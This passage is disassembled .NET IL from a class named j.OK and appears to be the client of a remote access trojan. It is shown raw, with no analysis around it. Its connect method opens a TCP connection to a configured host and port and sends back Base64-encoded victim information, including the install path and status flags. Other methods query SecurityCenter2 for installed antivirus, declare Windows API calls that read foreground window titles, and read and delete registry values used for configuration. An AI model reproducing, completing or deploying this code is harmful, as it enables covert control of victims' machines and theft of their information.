    IL_0002:  stsfld     bool j.OK::Cn
    IL_0007:  ldc.i4     0x7d0
    IL_000c:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_0011:  nop
    IL_0012:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_0017:  stloc.1
    IL_0018:  nop
    IL_0019:  ldloc.1
    IL_001a:  stloc.2
    IL_001b:  ldloc.2
    IL_001c:  call       void [mscorlib]System.Threading.Monitor::Enter(object)
    IL_0021:  nop
    .try
    {
      .try
      {
        IL_0022:  nop
        IL_0023:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_0028:  ldnull
        IL_0029:  cgt.un
        IL_002b:  stloc.3
        IL_002c:  ldloc.3
        IL_002d:  brfalse.s  IL_0067

        .try
        {
          IL_002f:  nop
          IL_0030:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
          IL_0035:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Close()
          IL_003a:  nop
          IL_003b:  ldnull
          IL_003c:  stsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
          IL_0041:  leave.s    IL_0065

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_0043:  dup
          IL_0044:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0049:  stloc.s    exception1
          IL_004b:  nop
          IL_004c:  ldloc.s    exception1
          IL_004e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0053:  nop
          IL_0054:  ldloc.s    exception1
          IL_0056:  stloc.s    exception
          IL_0058:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_005d:  nop
          IL_005e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0063:  leave.s    IL_0065

        }  // end handler
        IL_0065:  nop
        IL_0066:  nop
        IL_0067:  nop
        .try
        {
          IL_0068:  nop
          IL_0069:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
          IL_006e:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
          IL_0073:  nop
          IL_0074:  leave.s    IL_0098

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_0076:  dup
          IL_0077:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_007c:  stloc.s    exception6
          IL_007e:  nop
          IL_007f:  ldloc.s    exception6
          IL_0081:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0086:  nop
          IL_0087:  ldloc.s    exception6
          IL_0089:  stloc.s    exception2
          IL_008b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0090:  nop
          IL_0091:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0096:  leave.s    IL_0098

        }  // end handler
        IL_0098:  nop
        IL_0099:  leave.s    IL_00bd

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_009b:  dup
        IL_009c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_00a1:  stloc.s    exception7
        IL_00a3:  nop
        IL_00a4:  ldloc.s    exception7
        IL_00a6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_00ab:  nop
        IL_00ac:  ldloc.s    exception7
        IL_00ae:  stloc.s    exception3
        IL_00b0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00b5:  nop
        IL_00b6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00bb:  leave.s    IL_00bd

      }  // end handler
      IL_00bd:  nop
      .try
      {
        IL_00be:  nop
        IL_00bf:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_00c4:  stsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
        IL_00c9:  newobj     instance void [System]System.Net.Sockets.TcpClient::.ctor()
        IL_00ce:  stsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_00d3:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_00d8:  ldc.i4     0x32000
        IL_00dd:  callvirt   instance void [System]System.Net.Sockets.TcpClient::set_ReceiveBufferSize(int32)
        IL_00e2:  nop
        IL_00e3:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_00e8:  ldc.i4     0x32000
        IL_00ed:  callvirt   instance void [System]System.Net.Sockets.TcpClient::set_SendBufferSize(int32)
        IL_00f2:  nop
        IL_00f3:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_00f8:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_00fd:  ldc.i4     0x2710
        IL_0102:  callvirt   instance void [System]System.Net.Sockets.Socket::set_SendTimeout(int32)
        IL_0107:  nop
        IL_0108:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_010d:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_0112:  ldc.i4     0x2710
        IL_0117:  callvirt   instance void [System]System.Net.Sockets.Socket::set_ReceiveTimeout(int32)
        IL_011c:  nop
        IL_011d:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_0122:  ldsfld     string j.OK::H
        IL_0127:  ldsfld     string j.OK::P
        IL_012c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
        IL_0131:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Connect(string,
                                                                                         int32)
        IL_0136:  nop
        IL_0137:  ldc.i4.1
        IL_0138:  stsfld     bool j.OK::Cn
        IL_013d:  call       string j.OK::inf()
        IL_0142:  call       bool j.OK::Send(string)
        IL_0147:  pop
        .try
        {
          IL_0148:  nop
          IL_0149:  ldstr      "vn"
          IL_014e:  ldstr      ""
          IL_0153:  call       object j.OK::GTV(string,
                                                object)
          IL_0158:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
          IL_015d:  ldstr      ""
          IL_0162:  ldc.i4.0
          IL_0163:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectEqual(object,
                                                                                                                                           object,
                                                                                                                                           bool)
          IL_0168:  stloc.s    V_11
          IL_016a:  ldloc.s    V_11
          IL_016c:  brfalse.s  IL_0189

          IL_016e:  ldloc.s    str
          IL_0170:  ldsflda    string j.OK::VN
          IL_0175:  call       string j.OK::DEB(string&)
          IL_017a:  ldstr      "\r\n"
          IL_017f:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_0184:  stloc.s    str
          IL_0186:  nop
          IL_0187:  br.s       IL_01bb

          IL_0189:  nop
          IL_018a:  ldloc.s    str
          IL_018c:  ldstr      "vn"
          IL_0191:  ldstr      ""
          IL_0196:  call       object j.OK::GTV(string,
                                                object)
          IL_019b:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
          IL_01a0:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
          IL_01a5:  stloc.s    V_12
          IL_01a7:  ldloca.s   V_12
          IL_01a9:  call       string j.OK::DEB(string&)
          IL_01ae:  ldstr      "\r\n"
          IL_01b3:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_01b8:  stloc.s    str
          IL_01ba:  nop
          IL_01bb:  ldc.i4.s   16
          IL_01bd:  newarr     [mscorlib]System.String
          IL_01c2:  dup
          IL_01c3:  ldc.i4.0
          IL_01c4:  ldloc.s    str
          IL_01c6:  stelem.ref
          IL_01c7:  dup
          IL_01c8:  ldc.i4.1
          IL_01c9:  ldsfld     string j.OK::H
          IL_01ce:  stelem.ref
          IL_01cf:  dup
          IL_01d0:  ldc.i4.2
          IL_01d1:  ldstr      ":"
          IL_01d6:  stelem.ref
          IL_01d7:  dup
          IL_01d8:  ldc.i4.3
          IL_01d9:  ldsfld     string j.OK::P
          IL_01de:  stelem.ref
          IL_01df:  dup
          IL_01e0:  ldc.i4.4
          IL_01e1:  ldstr      "\r\n"
          IL_01e6:  stelem.ref
          IL_01e7:  dup
          IL_01e8:  ldc.i4.5
          IL_01e9:  ldsfld     string j.OK::DR
          IL_01ee:  stelem.ref
          IL_01ef:  dup
          IL_01f0:  ldc.i4.6
          IL_01f1:  ldstr      "\r\n"
          IL_01f6:  stelem.ref
          IL_01f7:  dup
          IL_01f8:  ldc.i4.7
          IL_01f9:  ldsfld     string j.OK::EXE
          IL_01fe:  stelem.ref
          IL_01ff:  dup
          IL_0200:  ldc.i4.8
          IL_0201:  ldstr      "\r\n"
          IL_0206:  stelem.ref
          IL_0207:  dup
          IL_0208:  ldc.i4.s   9
          IL_020a:  ldsfld     bool j.OK::Idr
          IL_020f:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_0214:  stelem.ref
          IL_0215:  dup
          IL_0216:  ldc.i4.s   10
          IL_0218:  ldstr      "\r\n"
          IL_021d:  stelem.ref
          IL_021e:  dup
          IL_021f:  ldc.i4.s   11
          IL_0221:  ldsfld     bool j.OK::IsF
          IL_0226:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_022b:  stelem.ref
          IL_022c:  dup
          IL_022d:  ldc.i4.s   12
          IL_022f:  ldstr      "\r\n"
          IL_0234:  stelem.ref
          IL_0235:  dup
          IL_0236:  ldc.i4.s   13
          IL_0238:  ldsfld     bool j.OK::Isu
          IL_023d:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_0242:  stelem.ref
          IL_0243:  dup
          IL_0244:  ldc.i4.s   14
          IL_0246:  ldstr      "\r\n"
          IL_024b:  stelem.ref
          IL_024c:  dup
          IL_024d:  ldc.i4.s   15
          IL_024f:  ldsfld     bool j.OK::BD
          IL_0254:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_0259:  stelem.ref
          IL_025a:  call       string [mscorlib]System.String::Concat(string[])
          IL_025f:  stloc.s    str
          IL_0261:  ldstr      "inf"
          IL_0266:  ldsfld     string j.OK::Y
          IL_026b:  ldloca.s   str
          IL_026d:  call       string j.OK::ENB(string&)
          IL_0272:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_0277:  call       bool j.OK::Send(string)
          IL_027c:  pop
          IL_027d:  leave.s    IL_02a1

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_027f:  dup
          IL_0280:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0285:  stloc.s    exception8
          IL_0287:  nop
          IL_0288:  ldloc.s    exception8
          IL_028a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_028f:  nop
          IL_0290:  ldloc.s    exception8
          IL_0292:  stloc.s    exception4
          IL_0294:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0299:  nop
          IL_029a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_029f:  leave.s    IL_02a1

        }  // end handler
        IL_02a1:  nop
        IL_02a2:  leave.s    IL_02cc

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_02a4:  dup
        IL_02a5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_02aa:  stloc.s    exception9
        IL_02ac:  nop
        IL_02ad:  ldloc.s    exception9
        IL_02af:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_02b4:  nop
        IL_02b5:  ldloc.s    exception9
        IL_02b7:  stloc.s    exception5
        IL_02b9:  ldc.i4.0
        IL_02ba:  stsfld     bool j.OK::Cn
        IL_02bf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_02c4:  nop
        IL_02c5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_02ca:  leave.s    IL_02cc

      }  // end handler
      IL_02cc:  nop
      IL_02cd:  leave.s    IL_02d8

    }  // end .try
    finally
    {
      IL_02cf:  ldloc.2
      IL_02d0:  call       void [mscorlib]System.Threading.Monitor::Exit(object)
      IL_02d5:  nop
      IL_02d6:  nop
      IL_02d7:  endfinally
    }  // end handler
    IL_02d8:  nop
    IL_02d9:  ldsfld     bool j.OK::Cn
    IL_02de:  stloc.0
    IL_02df:  br.s       IL_02e1

    IL_02e1:  ldloc.0
    IL_02e2:  ret
  } // end of method OK::connect

  .method public static string  DEB(string& s) cil managed
  {
    // Code size       21 (0x15)
    .maxstack  1
    .locals init ([0] string DEB,
             [1] uint8[] V_1)
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  ldind.ref
    IL_0003:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
    IL_0008:  stloc.1
    IL_0009:  ldloca.s   V_1
    IL_000b:  call       string j.OK::BS(uint8[]&)
    IL_0010:  stloc.0
    IL_0011:  br.s       IL_0013

    IL_0013:  ldloc.0
    IL_0014:  ret
  } // end of method OK::DEB

  .method public static void  DLV(string n) cil managed
  {
    // Code size       79 (0x4f)
    .maxstack  3
    .locals init ([0] class [mscorlib]System.Exception exception1,
             [1] class [mscorlib]System.Exception exception)
    IL_0000:  nop
    .try
    {
      IL_0001:  nop
      IL_0002:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0007:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_000c:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0011:  ldstr      "Software\\"
      IL_0016:  ldsfld     string j.OK::RG
      IL_001b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0020:  ldc.i4.1
      IL_0021:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0026:  ldarg.0
      IL_0027:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string)
      IL_002c:  nop
      IL_002d:  leave.s    IL_004d

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_002f:  dup
      IL_0030:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0035:  stloc.0
      IL_0036:  nop
      IL_0037:  ldloc.0
      IL_0038:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_003d:  nop
      IL_003e:  ldloc.0
      IL_003f:  stloc.1
      IL_0040:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0045:  nop
      IL_0046:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_004b:  leave.s    IL_004d

    }  // end handler
    IL_004d:  nop
    IL_004e:  ret
  } // end of method OK::DLV

  .method public static void  ED() cil managed
  {
    // Code size       9 (0x9)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  ldc.i4.0
    IL_0002:  call       void j.OK::pr(int32)
    IL_0007:  nop
    IL_0008:  ret
  } // end of method OK::ED

  .method public static string  ENB(string& s) cil managed
  {
    // Code size       17 (0x11)
    .maxstack  1
    .locals init ([0] string ENB)
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  call       uint8[] j.OK::SB(string&)
    IL_0007:  call       string [mscorlib]System.Convert::ToBase64String(uint8[])
    IL_000c:  stloc.0
    IL_000d:  br.s       IL_000f

    IL_000f:  ldloc.0
    IL_0010:  ret
  } // end of method OK::ENB

  .method public static pinvokeimpl("user32.dll" nomangle ansi lasterr winapi) 
          native int  GetForegroundWindow() cil managed preservesig
  {
  }
  .method private static pinvokeimpl("kernel32" as "GetVolumeInformationA" nomangle ansi lasterr winapi) 
          int32  GetVolumeInformation(string&  marshal( byvalstr) lpRootPathName,
                                      string&  marshal( byvalstr) lpVolumeNameBuffer,
                                      int32 nVolumeNameSize,
                                      int32& lpVolumeSerialNumber,
                                      int32& lpMaximumComponentLength,
                                      int32& lpFileSystemFlags,
                                      string&  marshal( byvalstr) lpFileSystemNameBuffer,
                                      int32 nFileSystemNameSize) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("user32.dll" as "GetWindowTextA" nomangle ansi lasterr winapi) 
          int32  GetWindowText(native int hWnd,
                               string&  marshal( byvalstr) WinTitle,
                               int32 MaxLength) cil managed preservesig
  {
  }
  .method public static string  GetAntiVirus() cil managed
  {
    // Code size       458 (0x1ca)
    .maxstack  7
    .locals init ([0] string GetAntiVirus,
             [1] string AV,
             [2] int32 fir,
             [3] int32 Sec,
             [4] int32 Thr,
             [5] object obj4,
             [6] object objectValue,
             [7] object[] arguments,
             [8] bool[] copyBack,
             [9] object Obf,
             [10] class [mscorlib]System.Collections.IEnumerator enumerator,
             [11] bool V_11,
             [12] object 'instance',
             [13] bool V_13,
             [14] bool V_14,
             [15] int32 V_15,
             [16] class [mscorlib]System.Exception ex,
             [17] bool V_17)
    IL_0000:  nop
    .try
    {
      IL_0001:  nop
      IL_0002:  nop
      IL_0003:  ldc.i4.1
      IL_0004:  stloc.s    Thr
      IL_0006:  ldstr      "Select * From AntiVirusProduct"
      IL_000b:  stloc.s    obj4
      IL_000d:  nop
      IL_000e:  ldc.i4.2
      IL_000f:  stloc.s    Thr
      IL_0011:  ldstr      "winmgmts:\\\\.\\root\\SecurityCenter2"
      IL_0016:  ldnull
      IL_0017:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::GetObject(string,
                                                                                                      string)
      IL_001c:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0021:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0026:  stloc.s    objectValue
      IL_0028:  nop
      IL_0029:  ldc.i4.3
      IL_002a:  stloc.s    Thr
      IL_002c:  ldc.i4.1
      IL_002d:  newarr     [mscorlib]System.Object
      IL_0032:  dup
      IL_0033:  ldc.i4.0
      IL_0034:  ldloc.s    obj4
      IL_0036:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_003b:  stelem.ref
      IL_003c:  stloc.s    arguments
      IL_003e:  ldc.i4.1
      IL_003f:  newarr     [mscorlib]System.Boolean
      IL_0044:  dup
      IL_0045:  ldc.i4.0
      IL_0046:  ldc.i4.1
      IL_0047:  stelem.i1
      IL_0048:  stloc.s    copyBack
      IL_004a:  ldloc.s    copyBack
      IL_004c:  ldc.i4.0
      IL_004d:  ldelem.u1
      IL_004e:  stloc.s    V_11
      IL_0050:  ldloc.s    V_11
      IL_0052:  brfalse.s  IL_0065

      IL_0054:  ldloc.s    arguments
      IL_0056:  ldc.i4.0
      IL_0057:  ldelem.ref
      IL_0058:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_005d:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0062:  stloc.s    obj4
      IL_0064:  nop
      IL_0065:  nop
      IL_0066:  ldloc.s    objectValue
      IL_0068:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_006d:  ldnull
      IL_006e:  ldstr      "ExecQuery"
      IL_0073:  ldloc.s    arguments
      IL_0075:  ldnull
      IL_0076:  ldnull
      IL_0077:  ldloc.s    copyBack
      IL_0079:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_007e:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0083:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0088:  stloc.s    Obf
      IL_008a:  nop
      IL_008b:  ldc.i4.4
      IL_008c:  stloc.s    Thr
      IL_008e:  ldloc.s    Obf
      IL_0090:  castclass  [mscorlib]System.Collections.IEnumerable
      IL_0095:  callvirt   instance class [mscorlib]System.Collections.IEnumerator [mscorlib]System.Collections.IEnumerable::GetEnumerator()
      IL_009a:  stloc.s    enumerator
      IL_009c:  br.s       IL_00e3

      IL_009e:  ldloc.s    enumerator
      IL_00a0:  callvirt   instance object [mscorlib]System.Collections.IEnumerator::get_Current()
      IL_00a5:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_00aa:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_00af:  stloc.s    'instance'
      IL_00b1:  nop
      IL_00b2:  ldc.i4.1
      IL_00b3:  stloc.3
      IL_00b4:  nop
      IL_00b5:  ldc.i4.6
      IL_00b6:  stloc.s    Thr
      IL_00b8:  ldloc.s    'instance'
      IL_00ba:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_00bf:  ldnull
      IL_00c0:  ldstr      "displayName"
      IL_00c5:  ldc.i4.0
      IL_00c6:  newarr     [mscorlib]System.Object
      IL_00cb:  ldnull
      IL_00cc:  ldnull
      IL_00cd:  ldnull
      IL_00ce:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_00d3:  callvirt   instance string [mscorlib]System.Object::ToString()
      IL_00d8:  stloc.1
      IL_00d9:  leave      IL_01b7

      IL_00de:  nop
      IL_00df:  ldc.i4.7
      IL_00e0:  stloc.s    Thr
      IL_00e2:  nop
      IL_00e3:  ldloc.s    enumerator
      IL_00e5:  callvirt   instance bool [mscorlib]System.Collections.IEnumerator::MoveNext()
      IL_00ea:  stloc.s    V_13
      IL_00ec:  ldloc.s    V_13
      IL_00ee:  brtrue.s   IL_009e

      IL_00f0:  ldloc.s    enumerator
      IL_00f2:  isinst     [mscorlib]System.IDisposable
      IL_00f7:  ldnull
      IL_00f8:  cgt.un
      IL_00fa:  stloc.s    V_14
      IL_00fc:  ldloc.s    V_14
      IL_00fe:  brfalse.s  IL_010e

      IL_0100:  ldloc.s    enumerator
      IL_0102:  isinst     [mscorlib]System.IDisposable
      IL_0107:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_010c:  nop
      IL_010d:  nop
      IL_010e:  nop
      IL_010f:  nop
      IL_0110:  ldc.i4.8
      IL_0111:  stloc.s    Thr
      IL_0113:  ldstr      "No AV"
      IL_0118:  stloc.1
      IL_0119:  leave      IL_01b7

      IL_011e:  nop
      IL_011f:  ldc.i4.0
      IL_0120:  stloc.2
      IL_0121:  nop
      IL_0122:  ldloc.2
      IL_0123:  ldc.i4.1
      IL_0124:  add.ovf
      IL_0125:  stloc.s    V_15
      IL_0127:  ldloc.s    V_15
      IL_0129:  ldc.i4.1
      IL_012a:  sub
      IL_012b:  switch     ( 
                            IL_0156,
                            IL_015c,
                            IL_0162,
                            IL_0168,
                            IL_016e,
                            IL_0174,
                            IL_017a,
                            IL_0180,
                            IL_0183)
      IL_0154:  br.s       IL_0186

      IL_0156:  nop
      IL_0157:  br         IL_0002

      IL_015c:  nop
      IL_015d:  br         IL_000d

      IL_0162:  nop
      IL_0163:  br         IL_0028

      IL_0168:  nop
      IL_0169:  br         IL_008a

      IL_016e:  nop
      IL_016f:  br         IL_00b1

      IL_0174:  nop
      IL_0175:  br         IL_00b4

      IL_017a:  nop
      IL_017b:  br         IL_00de

      IL_0180:  nop
      IL_0181:  br.s       IL_010f

      IL_0183:  nop
      IL_0184:  leave.s    IL_01b7

      IL_0186:  nop
      IL_0187:  leave.s    IL_01b6

      IL_0189:  nop
      IL_018a:  ldloc.s    Thr
      IL_018c:  stloc.2
      IL_018d:  nop
      IL_018e:  ldloc.3
      IL_018f:  brfalse.s  IL_0199

      IL_0191:  br.s       IL_0193

      IL_0193:  ldloc.3
      IL_0194:  ldc.i4.1
      IL_0195:  beq.s      IL_019c

      IL_0197:  br.s       IL_01a2

      IL_0199:  nop
      IL_019a:  leave.s    IL_01b6

      IL_019c:  nop
      IL_019d:  br         IL_011e

      IL_01a2:  nop
      IL_01a3:  leave.s    IL_01b5

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01a5:  dup
      IL_01a6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01ab:  stloc.s    ex
      IL_01ad:  nop
      IL_01ae:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01b3:  leave.s    IL_0189

    }  // end handler
    IL_01b5:  nop
    IL_01b6:  nop
    IL_01b7:  nop
    IL_01b8:  ldloc.2
    IL_01b9:  ldc.i4.0
    IL_01ba:  cgt.un
    IL_01bc:  stloc.s    V_17
    IL_01be:  ldloc.s    V_17
    IL_01c0:  brfalse.s  IL_01c3

    IL_01c2:  nop
    IL_01c3:  nop
    IL_01c4:  ldloc.1
    IL_01c5:  stloc.0
    IL_01c6:  br.s       IL_01c8

    IL_01c8:  ldloc.0
    IL_01c9:  ret
  } // end of method OK::GetAntiVirus

  .method public static pinvokeimpl("user32.dll" as "GetWindowTextLengthA" nomangle ansi lasterr winapi) 
          int32  GetWindowTextLength(int64 hwnd) cil managed preservesig
  {
  }
  .method public static object  GTV(string n,
                                    object 'ret') cil managed
  {
    // Code size       106 (0x6a)
    .maxstack  3
    .locals init ([0] object GTV,
             [1] object obj2,
             [2] class [mscorlib]System.Exception exception1,
             [3] class [mscorlib]System.Exception exception)
    IL_0000:  nop
    .try
    {
      IL_0001:  nop
      IL_0002:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0007:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_000c:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0011:  ldstr      "Software\\"
      IL_0016:  ldsfld     string j.OK::RG
      IL_001b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0020:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string)
      IL_0025:  ldarg.0
      IL_0026:  ldarg.1
      IL_0027:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_002c:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0031:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                           object)
      IL_0036:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_003b:  stloc.1
      IL_003c:  leave.s    IL_0063

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_003e:  dup
      IL_003f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0044:  stloc.2
      IL_0045:  nop
      IL_0046:  ldloc.2
      IL_0047:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_004c:  nop
      IL_004d:  ldloc.2
      IL_004e:  stloc.3
      IL_004f:  ldarg.1
      IL_0050:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0055:  stloc.1
      IL_0056:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_005b:  nop
      IL_005c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
